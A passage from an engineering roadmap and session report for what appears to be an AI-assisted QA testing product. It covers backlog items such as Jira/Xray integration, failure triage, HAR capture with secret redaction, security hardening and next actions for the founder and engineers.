| # | Item | Problem / evidence | Value | Depends on | Approach | Acceptance criteria | Tests | Risks / rollback | Success metric | Effort |
|---|---|---|---|---|---|---|---|---|---|---|
| 1 | Measure live generation | never run (§2) | know if the on-ramp works | AI credit or a local model (founder) | `make eval-generation` on the demo + 3 corpus stories; fix what it shows | bars in evals/generation_quality.py met on 3 stories | the harness (exists) | model drift → re-measure per model change | coverage 100%, traced ≥90%, grounded ≥90%, planted bug found, 0 false failures | 1–3 (uncertain: depends on results) |
| 2 | Jira story in / bugs out, live | never exercised (§2) | the promised loop | Jira trial (founder) | run the E2E flow with a story key on one corpus app; file 1 bug live with explicit OK | story read, bug filed, linked, verdict comment posted, duplicate check works | a recorded live run in evidence | live writes → only with operator OK | 1 complete loop recorded | 1 |
| 3 | Xray (+ Zephyr) live | mocked only | export/results for Xray teams | Xray trial (founder) | export 5 cases, import one execution | issues created with steps; execution shows verdicts | recorded run | — | 1 recorded run | 1–2 (uncertain) |
| 4 | ✅ DONE 2026-10-20 — Failure triage rules | ERROR is one bucket (§6 step 8) | less time on non-bugs | — | classify: environment (DNS/connection/5xx burst/timeouts on navigate), test (unknown element, assertion unevaluable), app (assertion mismatch on a loaded page) | each result carries `cause`; report groups by it | unit + demo-app cases per class | misclassification → keep the raw evidence visible | bench: cause correct on seeded failures | 2 |
| 5 | ✅ DONE — HAR on failure | no network evidence (§2) | API-level root cause | — | `record_har` per failing case, secrets redacted | a failing case links a HAR without Authorization/cookies | trace-like secret test | size → keep only for failures | evidence completeness | 1 |
| 6 | ✅ DONE — Settings screen (status only) | Jira/AI config only in .env (§6 step 4) | onboarding | — | read-only status of AI/Jira/Xray/live-export, never values; how to enable | a newcomer sees why filing is dry-run | UI test | never echo secrets | Quickstart time (Phase 0) | 1 |
| 7 | Dead code | re-checked: nothing to remove (§2) | — | — | — | — | — | — | — | done (no change) |
| 8 | ✅ DONE 2026-10-20 — Hardening round E10–E14 | §3b | trust | — | see §3b | see §3b | tests/test_hardening_round.py | each is a guard; no flag | — | 1 |

### P2 — differentiation
| # | Item | Value | Depends | Acceptance | Effort |
|---|---|---|---|---|---|
| 1 | ✅ DONE (first version) — Change → test selection | run what a change can break | map (exists), routes in the diff | seeded changes on PetClinic/eShop: 0 missed regressions, ≥40% fewer cases than "all" | 5–8 (uncertain) |
| 2 | PR comment with per-criterion verdicts + CI on a real repo | the loop in the developer's tool | pushable repo (founder), P2-1 | one real PR shows the comment | 2 |
| 3 | ✅ DONE — Project home (both tracks), coverage-gaps / critical-findings / readiness cards | one place to decide | overview (exists) | cards per §7 from real data only | 3 |
| 4 | ✅ DONE — Flaky quarantine | stop flaky cases blocking | history (exists) | a flaky case is marked, not counted as FAIL, listed | 1 |
| 5 | ✅ DONE — Per-run cost for functional runs | budget | usage tracking | run duration + AI calls/≈USD per run and per generation (scoped meter; non-Claude providers counted, not priced); Cost card | 1 |
| 6 | axe-core | full WCAG audit | licence review (MPL-2.0) | axe results as observations | 1 |

### P3 — later
Native mobile (Appium), agent-run exploratory charters under the same verification rules, hosted
multi-tenant mode (after the hosted security gate, PLAN Phase 4–5), release proof bundles.

## 12. Implementation results (this session)

Code (branch feat/functional-qa-track): core/origin_guard.py; guards in action_mapper,
playwright_runner (route + redirect inspection), app_mapper, dom_analyzer; trace secrecy; GET-scan
refusal; mapper lock; AI-provider, repo and MCP hardening; Zephyr Cloud v2; core/project_overview.py
+ /api/overview + overview cards; evals/functional_bench.py + manifest + gate check; UI header,
consent text, footer, landing hero, README; fixes B1–B4. New tests: origin guard (attacker server),
reader origin, traces, GET scan, inputs hardening, Zephyr, Excel, overview, JS parse.
Later the same day: failure triage, HAR, settings/setup panel, project home cards, change-based selection
(+ seeded-change benchmark), adaptive settle wait, quarantine, the 10-app benchmark (79/79), and the hardening
round E10–E14 (public errors, Jira/Xray retries + token renewal, browser busy, grounding gate, healing rules,
per-run cost, evidence and change cards). Full results: commit messages and §3/§3b. **Not done:** everything
marked ⛔ in §2, and: a fresh dependency CVE scan (pip-audit not installed — needs approval to download), axe-core
(licence review + download), a team-defined readiness rule, the human baseline.

## 13. Next actions

1. Founder: AI credit or a local model → `make eval-generation` (the single most important unknown).
2. Founder: Jira trial + Xray trial → live story-in / bug-out run on one corpus app.
3. Eng (needs approval to download): pip-audit CVE scan; axe-core after the licence review.
4. Eng: more seeded-change apps for selection (eShop, Angular) to move beyond n = 3 on one app.
5. Founder: 3 Phase-0 sessions using the new positioning; record which message lands.
